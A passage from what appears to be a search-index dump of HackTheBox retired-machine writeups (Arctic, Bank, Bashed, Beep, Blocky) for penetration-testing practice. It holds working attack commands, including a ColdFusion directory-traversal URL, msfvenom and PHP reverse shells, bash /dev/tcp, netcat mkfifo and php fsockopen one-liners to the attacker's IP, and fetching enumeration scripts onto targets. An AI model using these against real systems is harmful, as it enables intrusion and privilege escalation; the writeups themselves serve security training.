exploiting known vulnerabilities that had patches available. So it goes without saying, you should always update your software! The second thing worth mentioning is the way the application handled passwords. The password was first hashed using SHA1 and then cryptographically hashed using HMAC with a salt value as the key. All this was done on the client side! What does client side mean? The client has access to all of it (and can bypass all of it)! I was able to access the administrator account without knowing the plaintext password. Hashing passwords is a common approach to storing passwords securely. If an application gets hacked, the attacker should have to go through the trouble of cracking the hashed passwords before getting access to any user credentials. However, if hashing is being done on the client side as apposed to the server side, that would be equivalent to storing passwords in plaintext! As an attacker, I can bypass client side controls and use your hash to authenticate to your account. Therefore, in this case, if I get access to the password file I don\u2019t need to run a password cracker. Instead, I can simply pass the hash. Conclusion 6 machines down, 35 more to go!","title":"23. Arctic Writeup w/o Metasploit.md"},{"location":"Retired/Arctic Writeup wo Metasploit/#reconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on these ports. nmap -sC -sV -O -oA htb/arctic/nmap/initial 10.10.10.11 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that three port is open: Ports 135 49154: running Microsoft Windows RPC. Port 8500 : possibly running Flight Message Transfer Protocol (FMTP). Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA htb/arctic/nmap/full 10.10.10.11 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA htb/arctic/nmap/udp 10.10.10.11 We get back the following result.","title":"Reconnaissance"},{"location":"Retired/Arctic Writeup wo Metasploit/#enumeration","text":"Let\u2019s do some more enumeration on port 8500. Visit the URL in the browser. It takes about 30 seconds to perform every request! So we\u2019ll try and see if we could perform our enumeration manually before we resort to automated tools. When you visit the cfdocs/ directory, you\u2019ll find an administrator/ directory. When you click on the administrator/ directory, you\u2019re presented with an admin login page. Default/common credentials didn\u2019t work and a password cracker would take an unbelievably long time (30s per request), so we\u2019ll have to see if the application itself is vulnerable to any exploits. The login page does tell us that it\u2019s using Adobe ColdFusion 8, which is a web development application platform. We\u2019ll use the platform name to see if it contains any vulnerabilities. searchsploit -update # update database searchsploit --id adobe coldfusion id : Display the EDB-ID value rather than local path The application is using version 8, so we only care about exploits relevant to this specific version. After reviewing the exploits, two of them stand out: 14641 \u2014 Directory Traversal. We\u2019ll use that to get the password of the administrator. 45979 \u2014 Arbitrary file Upload. We\u2019ll use that to get a reverse shell on the target machine.","title":"Enumeration"},{"location":"Retired/Arctic Writeup wo Metasploit/#gaining-an-initial-foothold","text":"Let\u2019s look at the code for exploit 14641. We don\u2019t actually have to run the exploit file. Instead, we could just navigate to the above URL to display the content of the password.properties file. [http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en](http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en) The password is outputted to the screen! The password seems to be hashed, so we can\u2019t simply use it in the password field. We can try to crack it, but first let\u2019s see if there are any other vulnerabilities present in the way the application handles passwords on the client side. Right click on the page and select View Page Source . There, we find three pieces of important information on the steps taken to send the password to the backend. The password is taken from the password field and hashed using SHA1. This is done on the client side. Then the hashed password is HMAC-ed using a salt value taken from the parameter salt field. This is also done on the client side. The HMAC-ed password gets sent to the server with the salt value. There, I\u2019m assuming the server verifies that the hashed password was HMAC-ed with the correct salt value. form name= loginform action= /CFIDE/administrator/enter.cfm method= POST onSubmit= cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value)); The directory traversal vulnerability did not give us the plaintext password but instead gave us an already hashed password. 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 Therefore, instead of cracking the password (which can take a long time!) we can calculate the cfadminPassword.value and use an intercepting proxy to bypass the client side calculation. To quickly calculate the cfadminPassword value use the Console in your browser Developer Tools to run the following JS code. console.log(hex_hmac_sha1(document.loginform.salt.value, 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 )); What that does is cryptographically hash the hashed password we found with the salt value. This is equivalent to what the form does when you hit the login button. Therefore, to conduct the attack use the above JS code to calculate the HMAC of the password. Then set the Intercept to On in Burp and on the login page submit any random value in the password field and hit login. Intercept the request with Burp and change the cfadminPassword field to the value we got in the console and forward the request. This allows us to login as administrator without knowing the administrator password! This attack can be referred to as passing the hash. What we essentially did over here is bypass any client side scripts that hash and then HMAC the password and instead, did it by ourselves and sent the request directly to the server. If you had the original plaintext (not hashed) password, you wouldn\u2019t have to go through all this trouble. To make matters even worse, you need to perform the above steps in the short window of 30 seconds! The application seems to reload every 30 seconds and with every reload a new salt value is used. Now, you might ask \u201cwhy not just get the original salt value and when I intercept the request in Burp, change the salt value to the one I used in the JS code? This way I wouldn\u2019t have to abide by the 30 second rule\u201d. Great question! I had this idea as well, only to find out that the salt value is coming from the server side and seems to also be updated and saved on the server side. So, if you use a previous salt or your own made up salt, the application will reject it! Uploading a Reverse Shell Now that we successfully exploited the directory traversal vulnerability to gain access to the admin console, let\u2019s try to exploit the arbitrary file upload vulnerability to upload a reverse shell on the server. The exploit 45979 does not pan out. The directories listed in the exploit do not match the specific version of ColdFusion that is being used here. Arrexel did write an exploit that would work and was written specifically for this box. So it is technically cheating, but I have already spent enough time on this box, so I\u2019m going to use it! Note : The arbitrary file exploit does not require you to authenticate, so technically you don\u2019t need to exploit the directory traversal vulnerability beforehand, unless you plan on using the GUI. It is worth noting that in the Administrator GUI, there is a Debugging Logging Scheduled Tasks category that would allow us to upload files. Instead, I\u2019m going to use arrexal\u2019s exploit. First, generate a JSP reverse shell that will be run and served by the server. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 shell.jsp Next, run arrexal\u2019s exploit. python arb-file-exploit.py 10.10.10.11 8500 shell.jsp The exploit tells us where the exploit file was saved. Next, start up a listener on the attack machine. nc -nlvp 4444 Then visit the location of the exploit in the browser to run the shell.jsp file. [http://10.10.10.11:8500/userfiles/file/exploit.jsp](http://10.10.10.11:8500/userfiles/file/exploit.jsp) We have a shell! Grab the user flag. This is a non-privileged shell, so we\u2019ll have to find a way to escalate privileges.","title":"Gaining an Initial Foothold"},{"location":"Retired/Arctic Writeup wo Metasploit/#privilege-escalation","text":"Let\u2019s find out more about the system. It\u2019s running Microsoft Windows 2008 and has not had any updates! Copy the output of the systeminfo command and save it in a file. We\u2019ll use Windows Exploit Suggester to identify any missing patches that could potentially allow us to escalate privileges. First update the database. ./windows-exploit-suggester.py --update Then run the exploit suggester. ./windows-exploit-suggester.py --database 2019-10-12-mssb.xls --systeminfo /root/Desktop/htb/arctic/systeminfo.txt We have 3 non-Metasploit exploits. I tried MS11\u2013011 but I didn\u2019t get a privileged shell. MS10\u2013059 did work! I found an already compiled executable for it here . Disclaimer : You really should not use files that you don\u2019t compile yourself, especially if they open up a reverse shell to your machine. Although I\u2019m using this precompiled exploit, I don\u2019t vouch for it. I\u2019ll transfer the file using arrexal\u2019s exploit by simply changing the req parameter from ...CurrentFolder=/exploit.jsp to ...CurrentFolder=/exploit.exe Run the exploit in the same way and it uploads the exploit to the following directory on the target machine. cd C:\\ColdFusion8\\wwwroot\\userfiles\\file Start up another listener on the attack machine. nc -nlvp 6666 Run the exploit. exploit.exe 10.10.14.6 6666 We have system! Grab the root flag.","title":"Privilege Escalation"},{"location":"Retired/Arctic Writeup wo Metasploit/#lessons-learned","text":"What allowed me to gain initial access to the machine and escalate privileges, is exploiting known vulnerabilities that had patches available. So it goes without saying, you should always update your software! The second thing worth mentioning is the way the application handled passwords. The password was first hashed using SHA1 and then cryptographically hashed using HMAC with a salt value as the key. All this was done on the client side! What does client side mean? The client has access to all of it (and can bypass all of it)! I was able to access the administrator account without knowing the plaintext password. Hashing passwords is a common approach to storing passwords securely. If an application gets hacked, the attacker should have to go through the trouble of cracking the hashed passwords before getting access to any user credentials. However, if hashing is being done on the client side as apposed to the server side, that would be equivalent to storing passwords in plaintext! As an attacker, I can bypass client side controls and use your hash to authenticate to your account. Therefore, in this case, if I get access to the password file I don\u2019t need to run a password cracker. Instead, I can simply pass the hash.","title":"Lessons Learned"},{"location":"Retired/Arctic Writeup wo Metasploit/#conclusion","text":"6 machines down, 35 more to go!","title":"Conclusion"},{"location":"Retired/Bank Writeup/","text":"host: 10.10.10.29 Serivce Discovery nmap -A 10.10.10.29 Host is up (0.23s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA) | 2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA) |_ 256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA) 53/tcp open domain | dns-nsid: |_ bind.version: 9.9.5\u20133ubuntu0.14-Ubuntu 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) | http-title: HTB Bank \u2014 Logi |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel And we can see that we have 3 services running ssh, dns and http. I tried accessing the web server by typing http://10.10.10.29 in the url bar but it was just the default apache site. I saw that dns was open so I edited /etc/hosts to contain the ip of the machine plus the name server of the machine . The default name server for all HackTheBox machines is .htb so I edited the hosts file as followed cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 Debian # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet 10.10.10.29 bank.htb Now 10.10.10.29 resolves to bank.htb. I tried to do a zone transfer with dig but that didn\u2019t give me any information, so I accessed bank.htb and we were automatically redirected to bank.htb/login.php it was a login page for the bank site, I used curl to see what was in bank.htb/ because I couldn\u2019t access the root directory of the site it would always redirect me to /login.php with curl -v http://bank.htb you can see all the html source code for root directory of the site. Also it indicated that there was a 302 redirect. HTTP/1.1 302 Found Date: Fri, 25 Aug 2017 15:50:33 GMT Server: Apache/2.4.7 (Ubuntu) X-Powered-By: PHP/5.5.9\u20131ubuntu4.21 Set-Cookie: HTBBankAuth=mipq942thbgb8h1vuf94ck3u01; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache location: login.php Content-Length: 7322 Content-Type: text/html I then used DirBuster to find new files and directory in bank.htb. Most of the files and folders were 403,302 some 200 I found and interesting file named support and it was 200, so I tried accessing it but were being redirected to /login.php once again. So I installed this plugin on firefox called noredirect which allows to me stop any 302 redirections. For those who couldn\u2019t get Noredirect installed on firefox because of the firefox version was outdated there was an option to install anyway at the bottom of the page. Alternatively could\u2019ve used either Burpsuite or Zap-Proxy to catch the request and send it through as a 200 request. I added http://bank.htb/login.php to the noredirect plugin so it would stop redirecting to /login.php everytime. Now I\u2019m able to access http://bank.htb/ and we can see the transactions at the bank, and some other information\u2026 If we now go to /support.php we can see you can upload \u201ctickets\u201d as images, if you curl http://bank.htb/support.php and scroll through the html code you can see that the admin left him self a little nice note for himself. \u201c ! \u2014 [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] \u2192\u201d I created a php shell as followed ?php exec(\u201c/bin/bash -c \u2018bash -i /dev/tcp/10.10.x.x/4444 0 1\u2019\u201d); and named it shell.php I tried uploading it as shell.php but the site only wanted images uploaded. Then I remember that .htb runs as php so I added the .htb extension for my php shell since it can execute as php \u201cfor debugging purposes\u201d and the shell it\u2019s uploaded. Now all I had to do is set up a netcat listener to catch the shell. nc -l -v -p 4444 once we catch the shell we go into the box as www-data in the directory /var/www/bank/uploads/ www-data@bank:/var/www/bank/uploads$ We can go into the user\u2019s home directory chris and get the user flag user.txt, Got User Flag! Now time it\u2019s time for privilege escalation. I started by just browsing through the directories and in /var I found a folder named htb inside htb I found two files with execute permissions www-data@bank:/var/htb$ ls -la total 16 drwxr-xr-x 3 root root 4096 Jun 14 18:25 . drwxr-xr-x 14 root root 4096 May 29 18:41 .. drwxr-xr-x 2 root root 4096 Jun 14 18:30 bin -rwxr-xr-x 1 root root 356 Jun 14 18:30 emergency it seems like the system administrator has left an emergency exploit in case he forgets the root password of the system\u2026 My privilege before running the exploit uid=33(www-data) gid=33(www-data) groups=33(www-data) My privileges after running the emergency exploit ./emergency uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data) and now we can get the root flag. cat /root/root.txt Got Root Flag!","title":"20. Bank Writeup.md"},{"location":"Retired/Bashed Writeup/","text":"So, I just started with HackTheBox and the whole idea is truly amazing to have online CTF for hackers all around the world to practise and hone their skills. Another shoutout to IPPSEC , the images used in this writeup are taken from his videos for better understanding. This article is an easy to understand step by step process where I explain in detail one of the process of how to gain root access to the \u201cbashed\u201d machine. Let\u2019s dive in! Connecting to hackthebox machine and setting up OpenVPN you can watch it here . So, I won\u2019t discuss more about it and get into the core part where we start opening the doors one by one. The main goal is to gain root access to the bashed linux box and for now we only know its IP address ( 10.10.10.68 ). Nmap This is the first step that you will be carrying out in any CTF, where you need to hack into a machine as we need to figure out the ports i.e. gateways from where we can enter into the machine and Nmap is the best tool for it out there. nmap -sC -sV 10.10.10.168 The above command was the first one that I ran to figure out the ports that were open on the mahcine. The port 80 was open, except that nothing was open. Port 80 is one of the most common ports that you will find open on the vulnerable machines. Website So once we figure this out then I straight away opened the website, http://10.10.10.68 . This is mostly the first step, as the website in itself will lead you onto different clues and hints to break into the vulnerable machine. So once we open the website in our browser, we are presented with this page. This webpage has a link to a page where there described about phpbash and an image of a web-based shell command prompt is present. This page also provides us with a link to the Github page of phpbash where the code for the phpbash was present. The web-based shell gives us an idea that to hack the machine maybe we will need to launch the web shell that is being talked about. GoBuster Now, the second step we take while we receive an open port 80 or 443 is to use GoBuster to carry out a detailed search about the subdomains that might be present on this machine as those lead us to our clue in the next step. In the step to find out different subdomains we find a few listed above. We first visit the /uploads subdomain it was a blank white page. Then we went onto /php subdomain it contained the following data, exposing the sendMail.php file. Then we went onto the dev/ subdomain and there we came across the phpbash.php script which was a link to a web-based shell that was exposed for us to get into the next level to achieve root access. Web-Based Shell The web-based shell gave us access to a command line to run our commands, this a big step as now we have a command line to work with. So, as soon we got this shell, we will run our basic commands to figure out the extent of privileges we currently have. The first command is \u201cid\u201d to know the details about the user. So we are currently a user named, www-data. Now to check the privileges we have we will run a script to figure that out. To do that we need the script to be present on the vulnerable machine, so the first step will be to bring over the script from our machine to this machine. First of all we download the required script on our machine and then send it over to the folder where we are storing data regarding the bashed machine. Once the script is present on that particular folder then we setup a httpServer so the contents of the folder will be available across the network. Now, that we have setup the httpServer on our machine. We go back to the web-based shell on the vulnerable machine because as soon as the file is uploaded via the httpServer now we can download it on our machine using \u201ccurl\u201d or \u201cwget\u201d commands. Curl command wasn\u2019t present on this machine, so we had to use wget to download the file over to the vulnerable machine. var/www/html/dev# wget 10.10.14.30/LinEnum.sh The permission was denied when the above command was carried out from the given folder, we then to the /dev/shm directory and the above command worked. Once, we had the LinEnum.sh file we executed it to figure out the privileges and other details regarding the current user. var/www/html/dev/shm# bash LinEnum.sh We obtained the following results: The linux version is updated so there were extremely less chances of finding any vulnerability here. Currently our userid is (www-data), there is another user by the name of scriptmanager. We can use sudo without a password scriptmanager can run anything. The web shell that we have currently is not persistent. To check this out, we run the command sudo -u scriptmanager bash and python -c \u2018import pty;pty.spwan(\u201c/bin/bash\u201d)\u2019 but still we are www-data So, the web shell that we have obtained wasn\u2019t persistent and we needed to obtain a persistent shell so we had to execute a reverse shell. Pen-Test Monkey To make a reverse shell connection to the vulnerable machine we go to the cheat sheet list that is presented by the Pen-Test Monkey. It is an extremely useful tool. The first step is to setup a listener on our machine, where the reverse shell would pop up. So, once the listener is up we pass several commands in the web-based shell in the vulnerable machine to initiate the reverse shell (don\u2019t forget to change the IP address port number). Bash bash -i /dev/tcp/10.10.14.38/8081 0 1 Netcat rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.10.14.38 8081 /tmp/f PHP php -r $sock=fsockopen( 10.10.14.38\u201d,8081);exec( /bin/sh -i 3 3 2 3 ); After all these attempts we are still unable to launch a reverse shell. Then we try to upload a php reverse shell. Earlier when we were using GoBuster we came across a domain /uploads. We go to the particular directory in the vulnerable machine and try creating a file and see if we have the permission to do so, we type in the command var/www/html/uploads# touch test We opened the browser to check if the URL http://10.10.10.68/uploads/test works or not and lucky for us it worked. Then we copy over the php-reverse-shell.php file to our folder where we stored the LinEnum.sh files and using wget we download the php file in the vulnerable machine as we did before. We make the required changes to the php file, like changing the IP address and the port number to listen on. We transfer the php-reverse-shell.php file to the uploads folder and then we visit the URL http://10.10.10.68/uploads/php-reverse-shell.php on the browser. As soon as we visit this website the reverse shell pops up on our machine. Kali Machine We are back on our Kali machine where the reverse shell just spawned. We again carry out the basic commands to check what is the user privilege we have, if the shell is persistent or not. So the shell is persistent and we are still www-data. To change ourselves from www-data to scriptmanager we run the following commands $ sudo -u scriptmanager bash After executing the above command we again check which user we are and now we are scriptmanager. Now we do an \u201cls -la\u201d to see over which files and folders the scriptmanager has read, write or execute privileges. There is a folder named scripts with privileges assigned to the scriptmanager, we go inside it and again carry out \u201cls -la\u201d to get the details about the files present in the scripts folder. There are two files one of them is test.py which is under scriptmanager and the other file test.txt is under root, so we know now that we have to work with these two files now. We open the test.py and then analyse the code written within it, the code written in the test.py states to print \u201ctesting 123!\u201d in the test.txt file. There is one thing that is hard to notice but the test.txt file is updated every minute, we figure this when we carry out the \u201cls -la\u201d command and see that every minute the test.txt file is updated. This establish that there is a link between the test.py and test.txt and so whatever code we execute inside test.py those changes will take place as if changes are being made by a root user. From pen-test monkey we copy a python script to launch a root shell on the vulnerable machine ( format it properly and make changes in the IP address and port number before saving ) Let the code run by itself or just type in \u201cpython test.py\u201d and you should get a reverse shell, check the id and you should be root. And so that is how the bashed machine is hacked. Moral Be familiar with the tools you use, make a clear mental list of the steps you need to take at every step. Don\u2019t give up, that is one thing you will need a lot of while doing these CTFs and try to do them all by yourselves. It is tough in the beginning then you will slowly start to pick up steps along the way.","title":"35. Bashed Writeup.md"},{"location":"Retired/Bashed Writeup/#lets-dive-in","text":"Connecting to hackthebox machine and setting up OpenVPN you can watch it here . So, I won\u2019t discuss more about it and get into the core part where we start opening the doors one by one. The main goal is to gain root access to the bashed linux box and for now we only know its IP address ( 10.10.10.68 ).","title":"Let\u2019s dive in!"},{"location":"Retired/Bashed Writeup/#nmap","text":"This is the first step that you will be carrying out in any CTF, where you need to hack into a machine as we need to figure out the ports i.e. gateways from where we can enter into the machine and Nmap is the best tool for it out there. nmap -sC -sV 10.10.10.168 The above command was the first one that I ran to figure out the ports that were open on the mahcine. The port 80 was open, except that nothing was open. Port 80 is one of the most common ports that you will find open on the vulnerable machines.","title":"Nmap"},{"location":"Retired/Bashed Writeup/#website","text":"So once we figure this out then I straight away opened the website, http://10.10.10.68 . This is mostly the first step, as the website in itself will lead you onto different clues and hints to break into the vulnerable machine. So once we open the website in our browser, we are presented with this page. This webpage has a link to a page where there described about phpbash and an image of a web-based shell command prompt is present. This page also provides us with a link to the Github page of phpbash where the code for the phpbash was present. The web-based shell gives us an idea that to hack the machine maybe we will need to launch the web shell that is being talked about.","title":"Website"},{"location":"Retired/Bashed Writeup/#gobuster","text":"Now, the second step we take while we receive an open port 80 or 443 is to use GoBuster to carry out a detailed search about the subdomains that might be present on this machine as those lead us to our clue in the next step. In the step to find out different subdomains we find a few listed above. We first visit the /uploads subdomain it was a blank white page. Then we went onto /php subdomain it contained the following data, exposing the sendMail.php file. Then we went onto the dev/ subdomain and there we came across the phpbash.php script which was a link to a web-based shell that was exposed for us to get into the next level to achieve root access.","title":"GoBuster"},{"location":"Retired/Bashed Writeup/#web-based-shell","text":"The web-based shell gave us access to a command line to run our commands, this a big step as now we have a command line to work with. So, as soon we got this shell, we will run our basic commands to figure out the extent of privileges we currently have. The first command is \u201cid\u201d to know the details about the user. So we are currently a user named, www-data. Now to check the privileges we have we will run a script to figure that out. To do that we need the script to be present on the vulnerable machine, so the first step will be to bring over the script from our machine to this machine. First of all we download the required script on our machine and then send it over to the folder where we are storing data regarding the bashed machine. Once the script is present on that particular folder then we setup a httpServer so the contents of the folder will be available across the network. Now, that we have setup the httpServer on our machine. We go back to the web-based shell on the vulnerable machine because as soon as the file is uploaded via the httpServer now we can download it on our machine using \u201ccurl\u201d or \u201cwget\u201d commands. Curl command wasn\u2019t present on this machine, so we had to use wget to download the file over to the vulnerable machine. var/www/html/dev# wget 10.10.14.30/LinEnum.sh The permission was denied when the above command was carried out from the given folder, we then to the /dev/shm directory and the above command worked. Once, we had the LinEnum.sh file we executed it to figure out the privileges and other details regarding the current user. var/www/html/dev/shm# bash LinEnum.sh We obtained the following results: The linux version is updated so there were extremely less chances of finding any vulnerability here. Currently our userid is (www-data), there is another user by the name of scriptmanager. We can use sudo without a password scriptmanager can run anything. The web shell that we have currently is not persistent. To check this out, we run the command sudo -u scriptmanager bash and python -c \u2018import pty;pty.spwan(\u201c/bin/bash\u201d)\u2019 but still we are www-data So, the web shell that we have obtained wasn\u2019t persistent and we needed to obtain a persistent shell so we had to execute a reverse shell.","title":"Web-Based Shell"},{"location":"Retired/Bashed Writeup/#pen-test-monkey","text":"To make a reverse shell connection to the vulnerable machine we go to the cheat sheet list that is presented by the Pen-Test Monkey. It is an extremely useful tool. The first step is to setup a listener on our machine, where the reverse shell would pop up. So, once the listener is up we pass several commands in the web-based shell in the vulnerable machine to initiate the reverse shell (don\u2019t forget to change the IP address port number). Bash bash -i /dev/tcp/10.10.14.38/8081 0 1 Netcat rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.10.14.38 8081 /tmp/f PHP php -r $sock=fsockopen( 10.10.14.38\u201d,8081);exec( /bin/sh -i 3 3 2 3 ); After all these attempts we are still unable to launch a reverse shell. Then we try to upload a php reverse shell. Earlier when we were using GoBuster we came across a domain /uploads. We go to the particular directory in the vulnerable machine and try creating a file and see if we have the permission to do so, we type in the command var/www/html/uploads# touch test We opened the browser to check if the URL http://10.10.10.68/uploads/test works or not and lucky for us it worked. Then we copy over the php-reverse-shell.php file to our folder where we stored the LinEnum.sh files and using wget we download the php file in the vulnerable machine as we did before. We make the required changes to the php file, like changing the IP address and the port number to listen on. We transfer the php-reverse-shell.php file to the uploads folder and then we visit the URL http://10.10.10.68/uploads/php-reverse-shell.php on the browser. As soon as we visit this website the reverse shell pops up on our machine.","title":"Pen-Test Monkey"},{"location":"Retired/Bashed Writeup/#kali-machine","text":"We are back on our Kali machine where the reverse shell just spawned. We again carry out the basic commands to check what is the user privilege we have, if the shell is persistent or not. So the shell is persistent and we are still www-data. To change ourselves from www-data to scriptmanager we run the following commands $ sudo -u scriptmanager bash After executing the above command we again check which user we are and now we are scriptmanager. Now we do an \u201cls -la\u201d to see over which files and folders the scriptmanager has read, write or execute privileges. There is a folder named scripts with privileges assigned to the scriptmanager, we go inside it and again carry out \u201cls -la\u201d to get the details about the files present in the scripts folder. There are two files one of them is test.py which is under scriptmanager and the other file test.txt is under root, so we know now that we have to work with these two files now. We open the test.py and then analyse the code written within it, the code written in the test.py states to print \u201ctesting 123!\u201d in the test.txt file. There is one thing that is hard to notice but the test.txt file is updated every minute, we figure this when we carry out the \u201cls -la\u201d command and see that every minute the test.txt file is updated. This establish that there is a link between the test.py and test.txt and so whatever code we execute inside test.py those changes will take place as if changes are being made by a root user. From pen-test monkey we copy a python script to launch a root shell on the vulnerable machine ( format it properly and make changes in the IP address and port number before saving ) Let the code run by itself or just type in \u201cpython test.py\u201d and you should get a reverse shell, check the id and you should be root. And so that is how the bashed machine is hacked.","title":"Kali Machine"},{"location":"Retired/Bashed Writeup/#moral","text":"Be familiar with the tools you use, make a clear mental list of the steps you need to take at every step. Don\u2019t give up, that is one thing you will need a lot of while doing these CTFs and try to do them all by yourselves. It is tough in the beginning then you will slowly start to pick up steps along the way.","title":"Moral"},{"location":"Retired/Beep Writeup/","text":"HackTheBox Writeup \u2014 Beep NMAP Results So we run NMAP against the target 10.10.10.7 and get Web Services We run the IP in the browser , but it redirects us to HTTPS websites We see that its running Elastix , running Gobuster on it , we get Running searchsploit for elastix , we get We get few exploits , the one which looks interesting is the LFI and Remote Code Execution one , let\u2019s try the LFI one We see it gave us the location of the LFI , which is the /vtigercrm directory , which we saw in the gobuster results too , let\u2019s copy it and see the result We get something , but its hard to read this rendered file , so we view the source code We get many things like users and password for FreePBX which can be accessed through the /admin We get prompted for username and password , so we will enter the creds for admin as we got before and hit OK We got successfully logged in and see that its running FreePBX version 2.8.1.4 I tried many exploits for this , but it didnt worked for me , so as we saw that ssh is open and we have password for admin from the config file we got , let\u2019s try to connect to root through it So we got it as root , it was a proper guess work here , coz I have encountered same thing on some other boxes too as well Let\u2019s get the user flag which is located at home folder of the user as user.txt The root flag is located at the root folder as root.txt That\u2019s the box , really very CTF type from the perspective I solved this","title":"10. Beep Writeup.md"},{"location":"Retired/Beep Writeup/#hackthebox-writeup-beep","text":"","title":"HackTheBox Writeup \u2014 Beep"},{"location":"Retired/Beep Writeup/#nmap-results","text":"So we run NMAP against the target 10.10.10.7 and get","title":"NMAP Results"},{"location":"Retired/Beep Writeup/#web-services","text":"We run the IP in the browser , but it redirects us to HTTPS websites We see that its running Elastix , running Gobuster on it , we get Running searchsploit for elastix , we get We get few exploits , the one which looks interesting is the LFI and Remote Code Execution one , let\u2019s try the LFI one We see it gave us the location of the LFI , which is the /vtigercrm directory , which we saw in the gobuster results too , let\u2019s copy it and see the result We get something , but its hard to read this rendered file , so we view the source code We get many things like users and password for FreePBX which can be accessed through the /admin We get prompted for username and password , so we will enter the creds for admin as we got before and hit OK We got successfully logged in and see that its running FreePBX version 2.8.1.4 I tried many exploits for this , but it didnt worked for me , so as we saw that ssh is open and we have password for admin from the config file we got , let\u2019s try to connect to root through it So we got it as root , it was a proper guess work here , coz I have encountered same thing on some other boxes too as well Let\u2019s get the user flag which is located at home folder of the user as user.txt The root flag is located at the root folder as root.txt That\u2019s the box , really very CTF type from the perspective I solved this","title":"Web Services"},{"location":"Retired/Blocky Writeup/","text":"This is a writeup for the retired machine Blocky from HackTheBox.eu Host: 10.10.10.37 root@kali:~/Desktop# nmap -sV -sC 10.10.10.37 Starting Nmap 7.40 ( [https://nmap.org](https://nmap.org) ) at 2017\u201311\u201316 02:11 EST Nmap scan report for 10.10.10.37 Host is up (0.14s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA) |_ 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: BlockyCraft #8211; Under Construction! 8192/tcp closed sophos Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds Used DirBuster and the word list /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Some interesting files/folders I found were phpMyAdmin a plugins directory with multiple Java Archive files and the Wordpress login page. I downloaded the Jar files and decompiled BlockyCore.jar and \u2026 In plain text we can see that the credentials for phpMyAdmin. Once we log in into phpMyAdmin I started looking through the SQL database tables and the wordpress users were stored in the wp_users table. I changed the password to test123for the user Notch And using the new credentials I logged into the wordpress of dashboard Then I uploaded my php reverse shell I hit a dead end I couldn\u2019t figure out how to elevate my privileges so I went back and grabbed that password from the jar file and tried logging in through ssh with the same password and it worked! Now for the hardest part Privilege Escalation. I spent a long time enumerating the system but got nothing \u2026 How about we try the same password we got for phpMyAdmin for the SSH service as root \u2026 Overall this box was easy but very frustrating I was over thinking it way too much. But the point it\u2019s trying to get across is the dangers of password reuse. You should never use the same password on multiple accounts. If you do this, and an attacker is able to figure out your password for one account, he or she will be able to access all of your accounts. Also, I recommend using a different username for sensitive accounts. So how does one reduce the risk of password reuse attacks. Here are a few actions: Enable Two Factor Authentication (2FA) for all applications that support it Use a password manager to manage logins across applications like LastPass Intel True Key Dashlane RoboForm KeePass (Local vault) Use a password generator along with a password manager. Change your password frequently . You can find me on twitter @ 0Katz","title":"4. Blocky Writeup.md"},{"location":"Retired/Blue Writeup wo Metasploit/","text":"Reconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.40 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that nine ports are open: Port 139: running Microsoft Windows netbiois-ssn Port 445: running microsoft-ds Ports 135, 49152, 49153, 49154, 49155, 49156 49157: running msrpc Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA full 10.10.10.40 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA udp 10.10.10.40 I managed to root the box and write this blog, while this UDP scan still did not terminate. So instead I ran another UDP scan only for the top 1000 ports. Enumeration As usual, we\u2019ll run the general nmap 